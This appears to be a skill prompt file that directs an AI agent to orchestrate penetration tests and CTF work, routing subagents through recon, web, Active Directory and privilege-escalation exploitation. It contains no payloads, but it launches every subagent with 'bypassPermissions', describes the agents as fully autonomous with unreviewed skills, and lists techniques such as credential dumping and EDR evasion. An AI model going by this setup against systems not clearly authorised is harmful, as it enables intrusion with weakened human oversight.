---
name: orchestrator
description: >
  USE THIS SKILL when the user provides a target or list of targets (IPs,
  hostnames, URLs, subnets) and asks to attack, pentest, hack, scan, assess,
  or test them. ALSO USE THIS SKILL when the user references an existing
  engagement — resuming, continuing, picking up, checking status, or asking
  about next steps. Trigger phrases: "attack X", "pentest X", "hack X",
  "scan X", "start testing X", "pop X", "CTF target X", "engage X",
  "these targets", "resume engagement", "pick it up", "continue testing",
  "next steps", "where were we", "resuming", "advise next steps",
  "what should we do next", "engagement status".
  This is the entry point for all multi-phase penetration tests — handles
  recon, attack surface mapping, vulnerability chaining, and routes to
  technique skills for exploitation. Do NOT use when the user names a specific
  single technique (e.g., "run kerberoasting against X").
keywords:
  - pentest this target
  - start an engagement
  - scan this host
  - assess this network
  - attack this target
  - full pentest
  - start testing
  - engagement against
  - begin assessment
  - structured assessment
  - pentest orchestration
  - resume engagement
  - continue engagement
  - pick up where we left off
  - next steps engagement
  - engagement status
  - advise next steps
tools: []
opsec: medium
---

# Penetration Test Orchestrator

You are orchestrating a penetration test. Your job is to take a target,
establish scope, perform reconnaissance, map the attack surface, identify
vulnerabilities, chain them for maximum impact, and route to the correct
technique skills for exploitation. All testing is under explicit written
authorization.

> **NEVER SPAWN AGENTS WITHOUT OPERATOR APPROVAL.** Before every agent
> invocation — discovery, technique, spray, cracking, any subagent — present
> the routing decision to the operator and wait for explicit approval. This
> applies even when resuming after unrelated work (feature development,
> dashboard fixes, etc.). The only exception is the event watcher background
> script, which is a utility and not an agent. When presenting the decision,
> state: what skill, what agent, what target, and why. Then wait.

> **DO NOT RUN SCANNING TOOLS.** The orchestrator's most common failure is
> running `nmap`, `ffuf`, `nuclei`, or `netexec` directly instead of routing
> to the correct skill. You are a router, not a scanner. If you are about to
> type `nmap`, route to **network-recon** instead. If you are about to type
> `ffuf`, route to **web-discovery** instead. See "Commands the Orchestrator
> May Execute Directly" below for the exhaustive allowed list.

## Skill Routing Is Mandatory

When this skill says "Route to **skill-name**", you MUST execute that skill
through a domain subagent (preferred) or inline via `get_skill()` (fallback).

### Primary Path: Subagent Delegation

1. Look up the skill in the **Skill-to-Agent Routing Table** (see Subagent
   Delegation section) to find the correct domain agent.
2. Spawn the agent via the Task tool with the skill name, target info, and
   relevant context from the state summary.
3. Wait for the agent to return with findings.
4. Parse the return summary and record findings using state-writer MCP tools.

### Fallback Path: Inline Execution

If custom subagents are not installed, **STOP**. Do not continue without custom subagents.
Refer the operator to the README.md for installation instructions, and offer to assist.

For explicitly requested inline execution tasks, load the relevant skill first to 
review the methodologies and tooling within:

1. Call `get_skill("skill-name")` to load the full skill from the MCP skill-router
2. Read the returned SKILL.md content
3. Follow its instructions end-to-end

### Core Principle

Do NOT execute techniques without attempting to load a relevant skill first — even 
if the attack path seems obvious or you already know the technique. Technique skills 
contain curated payloads, edge-case handling, troubleshooting steps, and methodology 
that general knowledge lacks. Skipping skill loading trades thoroughness for speed and 
risks missing things on harder targets.

Always load skills via `get_skill()` before executing techniques — even if the
attack path seems obvious.

### Finding Skills

When you need a skill but don't know the exact name:
- `search_skills("description of what you need")` — semantic search, returns ranked matches
- `list_skills(category="web")` — browse all skills in a category

**Relevance validation**: Search results are ranked by embedding similarity, not
guaranteed relevance. Before tasking an agent with a result from a search result 
with `get_skill()`, verify the returned description actually matches your scenario. 
If the top result looks tangential, try a more specific query or browse with 
`list_skills()` instead.

### If the MCP Skill Router Is Unavailable

If `get_skill()`, `search_skills()`, or `list_skills()` return errors or are
not available as tools, **STOP**. Do not fall back to executing techniques
inline. Tell the user:

> MCP skill-router is not connected. Verify `.mcp.json` is configured and the
> server is running. If the index is missing, run:
> `uv run --directory tools/skill-router python indexer.py`
> then restart Claude Code.

### Commands the Orchestrator May Execute Directly

The orchestrator routes to skills — it does not run attack tools itself.
The only commands the orchestrator may execute directly are:

- `mkdir -p engagement/evidence/logs` — engagement directory creation
- File writes to `engagement/scope.md`, `engagement/activity.md`, `engagement/findings.md`.
  For `activity.md` and `findings.md` (append-only logs), use Bash `echo >>` or
  `cat >> ... <<'EOF'` instead of Read+Edit — avoids loading the full log into
  context just to append. Use Write/Edit only for `scope.md` (structured, may
  need mid-file edits).
- State-writer MCP tools (`init_engagement`, `add_target`, `add_credential`, `add_access`, `add_vuln`, `add_pivot`, `add_blocked`, `add_tunnel`, `update_tunnel`, and their update variants) — engagement state
- State-reader MCP tools (`get_state_summary`, `get_targets`, `get_credentials`, `get_access`, `get_vulns`, `get_pivot_map`, `get_blocked`, `get_tunnels`, `poll_events`) — state queries
- Skill-router MCP tools (`get_skill`, `search_skills`, `list_skills`) — skill routing
- `getent hosts <hostname>` — hostname resolution verification (local-only, no network traffic)
- `ldapsearch -x -H ldap://TARGET -b "DC=..." -s base lockoutThreshold lockOutObservationWindow lockoutDuration minPwdLength pwdProperties` — lockout policy query (safety-critical pre-spray check, single base-scope read, not enumeration)
- `ps aux | grep <tool>`, `kill <pid>` — subprocess cleanup after `TaskStop` (see Subprocess Cleanup below)

Everything else — nmap, netexec, ffuf, nuclei, httpx, sqlmap, curl, nc, evil-winrm,
any tool that sends traffic to a target — MUST go through the appropriate skill
via a domain subagent.

**No pre-scan triage.** Do not run httpx, curl, or any "quick look" at the
target before network-recon completes. The orchestrator's job is to set up the
engagement directory, route to network-recon, and wait.

**No inline credential testing.** Do not run `netexec smb`, `netexec winrm`,
`evil-winrm`, or any authentication tool to validate discovered credentials.
Delegate to **password-spray-agent** with the specific creds and services.

**No inline shell establishment.** Do not call `start_process` for evil-winrm,
ssh, or psexec.py from the orchestrator. When credentials are validated and
shell access is needed, spawn the appropriate discovery agent (ad-discovery,
linux-discovery, windows-discovery) with the credential context — the agent
establishes its own session via shell-server MCP.

**No inline browser interaction.** Do not use browser-server MCP tools from the
orchestrator. Web application interaction (navigating, form filling, exploiting)
goes through **web-exploit-agent** or **web-discovery-agent**.

**If you are unsure whether a command is on the allowed list, it is not.
Route to a skill.**

### Subprocess Cleanup After TaskStop

**CRITICAL: `TaskStop` kills the agent but NOT its child processes.**

When an agent spawns long-running tools via the Bash tool (hashcat, nxc,
ffuf, nmap, responder, etc.), those processes run in separate process groups.
`TaskStop` terminates the agent's Claude process, but the tools keep running
as orphans — consuming CPU, holding file locks, and potentially conflicting
with subsequent agents.

**After every `TaskStop` on a skill agent, immediately check for and kill
orphaned subprocesses:**

```bash
# Find orphaned processes from killed agent
ps aux | grep -E 'hashcat|nxc|netexec|ffuf|nmap|responder|mitm6|ntlmrelayx|certipy|bloodhound|manspider|gobuster|feroxbuster|nuclei|sqlmap' | grep -v grep

# Kill them (use the PIDs from the ps output)
kill <pid1> <pid2> ...

# Verify they're gone
ps aux | grep -E '<tool>' | grep -v grep
```

Do this for EVERY `TaskStop` — parallel resolution kills, manual agent kills,
and cleanup kills. The one-liner pattern:

```bash
# Kill all orphaned hashcat processes (example)
pkill -f 'hashcat.*kerberoast' 2>/dev/null || true
```

Use targeted `pkill -f` patterns that match the specific command rather
than broad tool names, to avoid killing processes from still-running agents.

### Subagent Delegation

The orchestrator delegates skill execution to **custom domain subagents** that
have full MCP access to the skill-router and category-specific servers. Each
subagent invocation executes **one skill** and returns — the orchestrator makes
every routing decision.

**Available subagents:**

| Agent | Domain | MCP Servers | Use For |
|-------|--------|-------------|---------|
| `network-recon-agent` | Network | skill-router, nmap-server, shell-server, state-interim | network-recon, smb-exploitation (haiku) |
| `pivoting-agent` | Pivoting | skill-router, shell-server, state-interim | pivoting-tunneling (sonnet) |
| `web-discovery-agent` | Web discovery | skill-router, shell-server, browser-server, state-interim | web-discovery |
| `web-exploit-agent` | Web exploitation | skill-router, shell-server, browser-server, state-interim | All web technique skills |
| `ad-discovery-agent` | AD discovery | skill-router, shell-server, state-interim | ad-discovery |
| `ad-exploit-agent` | AD exploitation | skill-router, shell-server, state-interim | All AD technique skills |
| `password-spray-agent` | Credential spraying | skill-router, shell-server, state-interim | password-spraying (haiku) |
| `linux-privesc-agent` | Linux privesc | skill-router, shell-server, state-interim | Linux discovery + technique skills, container escapes |
| `windows-privesc-agent` | Windows privesc | skill-router, shell-server, state-interim | Windows discovery + technique skills |
| `evasion-agent` | AV/EDR evasion | skill-router, shell-server, state-interim | AV bypass payload generation |
| `credential-cracking-agent` | Credential cracking | skill-router, state-interim | credential-cracking (haiku, local-only) |

**How to delegate:**

Spawn the appropriate domain agent via the Agent tool with
`mode: "bypassPermissions"`:

```
Agent(
    subagent_type="network-recon-agent",
    mode="bypassPermissions",
    prompt="Load skill 'network-recon'. Target: 10.10.10.5. No credentials provided.",
    description="Network recon on 10.10.10.5"
)
```

The agent will:
1. Call `get_skill("network-recon")` to load the skill
2. Follow the methodology, using MCP tools as needed (e.g., `nmap_scan`)
3. Report findings and return — the orchestrator records state changes and decides what to invoke next
4. Return a summary of findings and routing recommendations

**Operator live-tail.** After spawning any background agent, append its
label and JSONL transcript path to the dashboard file (one `label:path`
per line), then print a short hint.

**Path selection:** The Agent tool returns an `agentId`. Use `find` to
locate the JSONL file across all session directories — this survives
context compactions (which change the session ID mid-conversation):

```bash
find ~/.claude/projects/-$(pwd | tr / - | sed 's/^-//')/*/subagents/ \
  -name "agent-<agentId>.jsonl" 2>/dev/null
```

**Do NOT cache the session directory.** Compactions create a new session
ID, so agents spawned after compaction land in a different directory than
agents spawned before it. Always resolve from the `agentId`.

**Dashboard file write rules — ALWAYS APPEND (`>>`) unless safe to truncate.**

The dashboard file lives at `operator/agent-dashboard/.dashboard` (relative to
repo root).

- **Append (`>>`)** — the default. Use for EVERY new agent spawn.
- **Truncate (`>`)** — ONLY when launching the first agent of a brand-new
  batch AND no agents from any prior batch are still running. Check with
  `ps aux | grep -c 'agentId'` or by verifying all prior agent task IDs
  have completed before truncating.
- **Never remove individual entries.** When an agent completes while others
  are still running, leave its line in the file. The operator can dismiss
  completed panes from the dashboard UI with the `d` key. Removing a line
  while the agent (or its hashcat/spray subprocess) is still running makes
  it invisible to the operator.

If in doubt, **append**. A duplicate entry in the dashboard is harmless;
a missing entry hides the agent's output from the operator.

```bash
# SAFE — always works (append)
echo "web-discovery:~/.claude/projects/.../subagents/agent-<id>.jsonl" >> operator/agent-dashboard/.dashboard

# ONLY when ALL prior agents are done — start fresh
echo "ad-discovery:~/.claude/projects/.../subagents/agent-<id>.jsonl" > operator/agent-dashboard/.dashboard
# Then append subsequent agents in the same batch
echo "web-discovery:~/.claude/projects/.../subagents/agent-<id>.jsonl" >> operator/agent-dashboard/.dashboard
```

After writing, always print this hint:

```
Watch live: bash operator/agent-dashboard/dashboard.sh
```

The dashboard reads the dashboard file and tails all listed agent
output files. It works for both single and multiple agents — one consistent
command for the operator.

Print the hint for every backgrounded agent — network-recon, web-discovery,
web-exploit, ad-discovery, ad-exploit, linux-privesc, windows-privesc,
evasion, password-spray, and credential-cracking. Skip it only for the
event watcher (utility script, not an agent).

**Context passing — do NOT override skill methodology.** When routing to a
technique agent, pass discovery-phase findings as **informational context**,
not as directives to skip techniques. The skill's methodology determines what
to try — the orchestrator provides context, not restrictions.

- **WRONG:** *"Do NOT attempt PHP webshell uploads — they are blocked by
  content inspection."*
- **RIGHT:** *"Discovery found: basic PHP content (<?php) is blocked by
  content inspection. PHP short tags also blocked. The skill's full bypass
  methodology has not been tested yet."*
- **ALSO RIGHT:** *"Web proxy: http://127.0.0.1:8080. Route all
  attackbox-originated HTTP(S) traffic for this skill through that listener,
  including browser_open(proxy=...) and CLI web tooling."*

The technique skill contains curated bypass sequences (alternative extensions,
config file uploads, magic bytes, polyglots, etc.) that the discovery agent
never tested. Telling the agent to skip a technique class defeats the purpose
of routing to the skill in the first place.

**After every subagent return:**
1. Parse the agent's return summary for new targets, creds, access, vulns, pivots, blocked items
2. Call structured write tools to record findings (`add_target`, `add_credential`, `add_vuln`, etc.)
3. Append to `engagement/activity.md` with routing decision and skill outcome
4. Append to `engagement/findings.md` if vulnerabilities were confirmed
5. Call `get_state_summary()` and run the Step 5 decision logic
6. Spawn the next agent with the appropriate skill

**Each invocation = one skill.** Discovery skills find things and return.
The orchestrator decides which technique skill to invoke next. Subagents
never load a second skill or route to other skills — when the skill text says
"Route to X", that's the agent's cue to report findings and stop.

**Inline fallback:** If a custom subagent is not available (agent files not
installed), **STOP** and have the operator fix the issue. Skills are only
loaded inline when explicitly requested by the operator.

#### Skill-to-Agent Routing Table

Use this table to pick the right agent for each skill:

| Skill | Agent | Why |
|-------|-------|-----|
| network-recon | network-recon-agent | Needs nmap MCP |
| smb-exploitation | network-recon-agent | Network-level exploitation |
| pivoting-tunneling | pivoting-agent | Tunnel setup + verification (sonnet) |
| web-discovery | web-discovery-agent | Web enumeration + attack surface mapping |
| sql-injection-union, sql-injection-blind, sql-injection-error, sql-injection-stacked | web-exploit-agent | Web |
| xss-reflected, xss-stored, xss-dom | web-exploit-agent | Web |
| ssti-twig, ssti-jinja2, ssti-freemarker | web-exploit-agent | Web |
| command-injection, python-code-injection | web-exploit-agent | Web |
| ajp-ghostcat | web-exploit-agent | Web (Tomcat AJP exploitation) |
| tomcat-manager-deploy | web-exploit-agent | Web (Tomcat Manager WAR deployment) |
| ssrf, lfi, file-upload-bypass, smb-share-webshell, xxe | web-exploit-agent | Web |
| deserialization-java, deserialization-dotnet, deserialization-php | web-exploit-agent | Web |
| jwt-attacks, request-smuggling, nosql-injection, ldap-injection | web-exploit-agent | Web |
| idor, cors-misconfiguration, csrf | web-exploit-agent | Web |
| oauth-attacks, password-reset-poisoning, 2fa-bypass, race-condition | web-exploit-agent | Web |
| ad-discovery | ad-discovery-agent | AD enumeration + attack surface mapping |
| kerberos-roasting, kerberos-delegation, kerberos-ticket-forging | ad-exploit-agent | Kerberos attacks |
| adcs-template-abuse, adcs-access-and-relay, adcs-persistence | ad-exploit-agent | ADCS abuse |
| acl-abuse, credential-dumping, pass-the-hash | ad-exploit-agent | AD |
| password-spraying | password-spray-agent | Service-agnostic credential spraying (haiku) |
| gpo-abuse, trust-attacks, ad-persistence, auth-coercion-relay, sccm-exploitation | ad-exploit-agent | AD |
| linux-discovery | linux-privesc-agent | Linux host enum |
| linux-sudo-suid-capabilities, linux-cron-service-abuse, linux-file-path-abuse, linux-kernel-exploits | linux-privesc-agent | Linux privesc |
| container-escapes | linux-privesc-agent | Container context (Linux) |
| windows-discovery | windows-privesc-agent | Windows host enum |
| windows-token-impersonation, windows-service-dll-abuse, windows-uac-bypass | windows-privesc-agent | Windows privesc |
| windows-credential-harvesting, windows-kernel-exploits | windows-privesc-agent | Windows privesc |
| av-edr-evasion | evasion-agent | AV/EDR bypass payload generation |
| credential-cracking | credential-cracking-agent | Local-only cracking, parallelizable with other technique skills (haiku) |
| retrospective | _(inline — no agent needed)_ | Post-engagement, no target interaction |

#### Agent Spawning

All skills (discovery and technique) are delegated to domain agents. All
agent spawns use `mode: "bypassPermissions"`:

```
Agent(
    subagent_type="<agent>",
    mode="bypassPermissions",
    prompt="Load skill '<skill>'. Target: <IP>. ...",
    description="<description>"
)
```

#### Orchestrator Loop

The orchestrator runs a decision loop. Each iteration:

```
watcher_task_id = None   # track the running watcher

while objectives_not_met:
    summary = get_state_summary()
    analyze: unexploited vulns, unchained access, untested creds, pivot map
    pick highest-value next action → select skill + domain agent
    append to activity.md (routing decision)
    spawn agent in background with: skill name, target info, context
    if watcher_task_id: TaskStop(watcher_task_id)   # kill stale watcher
    watcher_task_id = spawn event watcher in background (cursor, db path)
    END TURN — user is free to interact

    # Notifications arrive asynchronously:
    # - Watcher fires → process interim findings, spawn follow-up + new watcher
    # - Agent completes → Post-Skill Checkpoint, next routing decision
    # - User messages → respond, poll_events() as supplementary check
```

Each iteration is normally one skill invocation. However, when 2+ viable paths
exist, the orchestrator **always suggests running them in parallel** (see
Parallel Path Selection). Agent spawns are always presented to the operator for
approval.

#### Built-in Task Sub-Agents (Warning)

**Built-in** Task sub-agents (Explore, Plan, general-purpose) do NOT have MCP
access and cannot invoke skills. Never use them for target-level work:
- No scanning or enumeration tools against targets
- No exploiting vulnerabilities
- No post-exploitation or privilege escalation

**What built-in sub-agents may be used for:**
- Pure research (searching for CVE details, reading documentation)
- Local processing (parsing scan output, compiling exploits)
- Anything that does not require skill routing or target interaction

For hash cracking and encrypted file cracking, use the **credential-cracking**
skill (inline) instead of ad-hoc cracking in a built-in sub-agent.

### Pre-Routing Checkpoint

Before every skill invocation, append to
`engagement/activity.md` with current findings. Format:
```
### [YYYY-MM-DD HH:MM:SS] orchestrator → routing to <skill-name>
- State: <brief summary of what's known>
- Reason: <why this skill was chosen>
```

### Event Monitoring

All agents write critical discoveries mid-run via state-interim MCP tools. Each
interim write (credential, vuln, pivot, blocked, tunnel) also emits a row to
the `state_events` table. The orchestrator uses a **background event watcher** to
get push notifications when agents find something — zero context burn, and the
user stays free to interact while agents work.

**Setup:** Maintain an `event_cursor` variable starting at `0`.

#### Background Event Watcher

The watcher is a shell script that polls `state_events` via Python's built-in
sqlite3 module and exits when new events arrive — triggering a task-notification
push to the orchestrator.

**Lifecycle:**

```
1. Orchestrator spawns discovery agent(s) in background
2. Orchestrator spawns watcher via Bash(run_in_background=true)
3. Orchestrator ENDS ITS TURN — user is free to chat

4. [time passes — agent works, writes findings to state.db]

5. Watcher detects new state_events row(s)
6. Watcher sleeps 5s (debounce — let agent finish its batch)
7. Watcher reads all new events, outputs them as JSON, exits
8. Task-notification pushes to orchestrator automatically

9. Orchestrator reads watcher output, displays findings
10. Present follow-up options to operator
11. Spawn NEW watcher with updated cursor
12. Repeat until all agents complete
```

**Watcher script** lives at `tools/hooks/event-watcher.sh` in the repo. It
uses Python's built-in `sqlite3` module (no CLI dependency) to poll and fetch
events as JSON. Args: `<cursor> <db_path>`. Polls every 5s, debounces 5s on
detection, 10-minute timeout.

**Spawning the watcher:**

Before spawning a new watcher, always kill the previous one (if any) to avoid
stale timeout notifications that waste tokens:

```
# Kill previous watcher if running
if watcher_task_id:
    TaskStop(task_id=watcher_task_id)

# Spawn new watcher and track its task ID
watcher_task_id = Bash(
    command="bash tools/hooks/event-watcher.sh <event_cursor> ./engagement/state.db",
    run_in_background=true,
    description="Event watcher (cursor <N>)"
)
```

#### Watcher Lifecycle Management

Track the current watcher's background task ID in a `watcher_task_id` variable.
**Always `TaskStop` the previous watcher before spawning a new one** — stale
watchers that timeout produce notifications that waste tokens on empty results.

- **Spawn**: After every background agent launch. Kill the previous watcher
  first (`TaskStop(watcher_task_id)`), then spawn a fresh one. One watcher
  suffices for multiple concurrent agents.
- **Respawn**: After every watcher notification, **kill the old watcher** (it
  already exited, but call `TaskStop` defensively), then **immediately spawn a
  new watcher** with the updated cursor — this minimizes the blind window. Then
  call `poll_events(since_id=<event_cursor>)` to catch any events written
  between the old watcher's exit and the new watcher's start. Display and
  process any gap events, then update the cursor. The new watcher is already
  running and will catch anything that arrives while you process the backfill.
- **Cleanup**: When all background agents have completed, `TaskStop` the
  running watcher and clear `watcher_task_id`. Do NOT spawn a new one.
- **On agent return**: If a watcher is still running and other agents are also
  still running, let it continue. If no agents remain running, `TaskStop` the
  watcher and clear `watcher_task_id`.

#### Actionable Event Criteria

When the watcher fires, read the JSON output and evaluate each event:

| Event Type | Actionable? | Follow-up Action |
|------------|-------------|-----------------|
| credential | Always | Authenticated enumeration or spray against services |
| vuln (high/critical) | When a technique skill exists | Spawn technique agent |
| vuln (medium/low/info) | Display only | Note for later |
| pivot | When destination is actionable | Spawn appropriate agent |
| blocked | Display only | Note for later |

Display the findings as a timeline, then present follow-up options via
`AskUserQuestion` (e.g., "AD-discovery found valid creds for Tiffany.Molina —
spin up authenticated AD enumeration while web-discovery continues?"). After
operator responds, spawn new watcher. Log routing decision to `activity.md`.

#### Display Format

When the watcher fires or `poll_events` returns new events, display them as a
compact timeline before continuing with the next action:

```
**[Interim findings from agents]**
| Time | Agent | Finding |
|------|-------|---------|
| 14:22:03 | web-discovery | credential: admin (password) |
| 14:22:15 | web-discovery | vuln: SQLi in /search [high] on 10.10.10.5 |
```

Update `event_cursor` to the highest event ID seen after each notification.

#### Supplementary Polling

The watcher is the primary notification mechanism. As a safety net, also call
`poll_events(since_id=<event_cursor>)` at these interaction points to catch
events written between watcher exit and new watcher spawn:
- When any agent returns (before parsing its return summary)
- Before every routing decision
- Before presenting choices to the operator

**Deduplication:** Events represent the same writes that already land in state
tables — they don't create extra work. The Post-Skill Checkpoint's existing
dedup logic (step 2) handles any overlap between event-visible findings and
the agent's return summary.

### Post-Skill Checkpoint

When a skill completes and returns control to the orchestrator:

0. **Poll events:** Call `poll_events(since_id=<event_cursor>)` and display any
   new findings as a timeline (see Event Monitoring above). Update the cursor.
1. Parse the subagent's return summary for new findings
2. **Deduplicate interim writes**: All agents use state-interim MCP and may
   have already written credentials, vulns, pivots, or blocked entries mid-run.
   Before calling `add_credential()`, `add_vuln()`, `add_pivot()`, or
   `add_blocked()`, call `get_state_summary()` and check if the finding already
   exists in state. Skip writes that would duplicate what the agent already
   recorded.
3. Call structured write tools to record state changes:
   - New hosts/ports → `add_target()` / `add_port()`
   - New credentials → `add_credential()`
   - Credential test results → `test_credential()`
   - Access gained/changed → `add_access()` / `update_access()`
   - Vulnerabilities confirmed → `add_vuln()` / `update_vuln()`
   - Pivot paths identified → `add_pivot()`
   - Failed techniques → `add_blocked()` — **see retry policy below**
   - **Retry policy for blocked techniques from discovery agents:**
     Discovery agents (web-discovery, ad-discovery, network-recon,
     linux-discovery, windows-discovery) perform preliminary testing with
     basic payloads. They are NOT equipped with the full bypass methodology
     of technique skills. When a discovery agent reports a technique as
     blocked (e.g., "PHP upload blocked by content inspection"), **always
     record with `retry: "with_context"`** — never `retry: "no"`. The
     corresponding technique skill (e.g., file-upload-bypass) has
     comprehensive bypass methodology (alternative extensions, .htaccess,
     magic bytes, polyglots, double extensions, etc.) that discovery agents
     don't test. Only a technique skill can definitively confirm a
     technique is blocked. Mark `retry: "no"` only when a **technique
     agent** (web-exploit, ad-exploit, linux-privesc, windows-privesc)
     exhausts its skill's methodology and still fails.
4. **Record tool workarounds**: If the agent's return summary mentions a
   tool-specific workaround (e.g., MSF encoder fix, proxy setting, auth
   flag), append it to the target's notes via `update_target(notes=...)`.
   This propagates automatically — all subsequent agents see target notes
   in `get_state_summary()`. Keep it to one line (e.g., "MSF: set
   ReverseAllowProxy true + encoder cmd/echo for cmd payloads").
5. Append to `engagement/activity.md` with skill outcome
6. Append to `engagement/findings.md` if vulnerabilities were confirmed
7. **Check for new usernames** — if the skill returned usernames not
   previously in state, trigger the **Usernames Found** hard stop before
   continuing. This applies to ANY skill that discovers users: network-recon
   (RPC/LDAP null session), web-discovery (user enumeration), ad-discovery
   (BloodHound/LDAP), SQLi (user table dump), credential-dumping (SAM/LSASS),
   or any other source.
8. Call `get_state_summary()` for routing decision
9. Run the Step 5 decision logic
10. Route to the next skill based on updated state

#### Parallel Path Returns

When a returning agent was part of a parallel run (see **Parallel Execution**),
steps 1–6 above still apply — parse findings, record state, record workarounds,
log activity, log findings. Steps 7–10 are replaced by the **Race Resolution** procedure. Do not
run decision logic or route to the next skill until all parallel agents have
completed or been killed.

Skills should NOT chain directly into other skills' scope areas. If a discovery
skill finds something outside its scope, it reports findings and returns — the
orchestrator records state changes and decides what to invoke next.

### Parallel Path Presentation

When presenting parallel paths, show the operator a concise table and
default to parallel execution.

**Format:**
```
**<N> viable paths** — recommend parallel:

| Path | Skill | Confidence | OPSEC | Notes |
|------|-------|------------|-------|-------|
| A | <skill-name> | high/medium/low | low/medium/high | <brief rationale> |
| B | <skill-name> | high/medium/low | low/medium/high | <brief rationale> |
```

Then use `AskUserQuestion` with a single-select question:
- **"Run in parallel (Recommended)"** — first to succeed wins, others killed
- **"Path A only — \<skill-name\>"**
- **"Path B only — \<skill-name\>"**
- (additional paths if more than 2)
- **"Run sequentially"** — try each in order, stop when one succeeds

If the operator selects parallel, execute the **Parallel Execution**
procedure. Otherwise, run the selected path(s) sequentially using the normal
orchestrator loop.

## Invocation Log

Immediately on activation — before scoping or doing any work — log invocation
to the screen:

1. **On-screen**: Print `[orchestrator] Activated → <target>` so the operator
   sees the engagement is starting.
2. **activity.md**: After creating the engagement directory in Step 1, append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → <target>
   - Invoked (engagement starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written as soon as the engagement directory exists.
Subsequent milestone entries append bullet points under this same header or
create new headers as phases progress.

## Resuming an Existing Engagement

If `engagement/state.db` already exists (the user said "resume", "continue",
"pick it up", "next steps", "where were we", etc.), **skip Step 1** entirely:

1. Call `get_state_summary()` to load the full engagement state.
2. Read `engagement/scope.md` if it exists. Recover operator-controlled
   workflow choices that are not stored in state (especially the `## Web Proxy`
   section). If a web proxy decision already exists, ensure the helper files
   `engagement/web-proxy.json` and `engagement/web-proxy.sh` match that
   decision before any web agent is spawned.
3. Print a concise status briefing for the operator: targets, current
   access, key vulns, active tunnels, blocked paths.
4. Append to `activity.md`:
   ```
   ### [YYYY-MM-DD HH:MM:SS] orchestrator → resumed
   - Engagement resumed. State loaded from state.db.
   ```
5. Run the **Step 5 decision logic** to determine the next action.
6. Present the recommended next action to the operator and wait for approval
   before spawning any agents.

Do NOT re-initialize scope, re-create the engagement directory, or re-run
`init_engagement()`. The state database is the source of truth.

## Step 1: Scope & Engagement Setup

### Define Scope

Gather from the user:
- **Targets**: IPs, hostnames, URLs, subnets, or domains in scope
- **Out of scope**: Hosts, services, or actions explicitly excluded
- **Credentials**: Any provided credentials, tokens, or API keys
- **Rules of engagement**: Testing windows, restricted techniques, notification
  requirements, OPSEC constraints
- **Objectives**: What does success look like? Domain admin? Data exfil proof?
  Specific system access?

### CTF Acknowledgement

**Hard stop** — the operator must acknowledge before proceeding.

Use `AskUserQuestion`:

**Question — CTF disclaimer** (single-select):
- Header: "Disclaimer"
- Question: "This orchestrator is a CTF solver. It runs fully autonomous agents with no OPSEC considerations. Skills have not been thoroughly reviewed by human eyes. By continuing, you accept responsibility for ensuring you have authorization to test the target and for this tool's actions. Confirm to proceed."
- Options:
  1. Confirm — Proceed with engagement
  2. Cancel — Abort

If the operator selects Cancel, stop immediately.

### Initialize Engagement Directory

Create the engagement directory structure:

```bash
mkdir -p engagement/evidence/logs
```

**engagement/scope.md** — record scope from user input:

```markdown
# Engagement Scope

## Targets
- <targets from user>

## Out of Scope
- <exclusions>

## Credentials
- <provided creds>

## Rules of Engagement
- <constraints>

## Objectives
- <goals>

## Web Proxy
- undecided until the first HTTP/HTTPS service is discovered
```

**engagement/state.db** — initialize via state-writer MCP:

Call `init_engagement(name="<engagement name>")` to create the SQLite state
database.

**engagement/activity.md** — start the activity log:

```markdown
# Activity Log
```

**engagement/findings.md** — start the findings tracker:

```markdown
# Findings
```

## Step 2: Reconnaissance

Map the attack surface by routing to discovery skills via subagent delegation.
Do not run scanning or enumeration tools directly from the orchestrator.

### Network Recon (if IP/subnet in scope)

**Hard stop — scan selection.**

Before spawning the network-recon agent, present the operator with scan
options via `AskUserQuestion`. The operator always chooses the scan type.

**Question — Scan type** (single-select):
- Header: "Scan type"
- Options:
  - Quick scan (Recommended) — top 1000 ports + service detection (`-sV -sC --top-ports 1000 -T4`)
  - Full scan — all 65535 ports + service detection + OS fingerprint (`-A -p- -T4`)
  - Import existing results — provide a path to nmap XML output (skip scanning)
  - Custom scan — describe the scan you'd like (ports, timing, scripts)

**After operator responds:**

- **Quick scan** or **Full scan**: Spawn **network-recon-agent** with the
  selected scan type passed in the prompt:

  ```
  Agent(
      subagent_type="network-recon-agent",
      mode="bypassPermissions",
      prompt="Load skill 'network-recon'. Target: <IP/range>. Credentials: <creds or 'none'>. Scan type: <quick|full>.",
      description="Network recon on <target>"
  )
  ```

- **Import existing results**: Ask for the file path (the "Other" text input
  captures this). Read the XML file, parse it for hosts/ports/services, and
  record findings directly via state-writer MCP tools (`add_target`,
  `add_port`). Skip spawning network-recon-agent entirely. Log to
  `engagement/activity.md`:
  ```
  ### [YYYY-MM-DD HH:MM:SS] orchestrator → imported scan results
  - Source: <path to XML>
  - Hosts found: N
  - Open ports: <summary>
  ```

- **Custom scan**: The operator's text input describes the scan. Pass it
  to network-recon-agent in the prompt so the agent can construct the
  appropriate nmap options:

  ```
  Agent(
      subagent_type="network-recon-agent",
      mode="bypassPermissions",
      prompt="Load skill 'network-recon'. Target: <IP/range>. Credentials: <creds or 'none'>. Custom scan request: <operator's description>.",
      description="Network recon on <target>"
  )
  ```

Do not execute nmap, masscan, or netexec commands inline. The agent has nmap
MCP access and will handle scanning directly.

Network-recon will:
1. Run host discovery (for subnets) and port scanning per the selected type
2. Enumerate services on each open port with quick-win checks (anonymous access,
   default creds, known CVEs)
3. Perform OS fingerprinting
4. Run vulnerability scanning (NSE scripts, nuclei)
5. Return routing recommendations for next steps

Wait for the agent to return before proceeding to attack surface mapping.

### Web Discovery (if HTTP/HTTPS found)

Before any web agent runs, trigger the **Web Proxy Setup** hard stop if
`engagement/scope.md` does not already record a `## Web Proxy` decision for
this engagement. This must be the **first** operator prompt after web ports are
identified.

STOP. After the proxy decision is recorded, spawn **web-discovery-agent** with
skill `web-discovery`:

```
Agent(
    subagent_type="web-discovery-agent",
    mode="bypassPermissions",
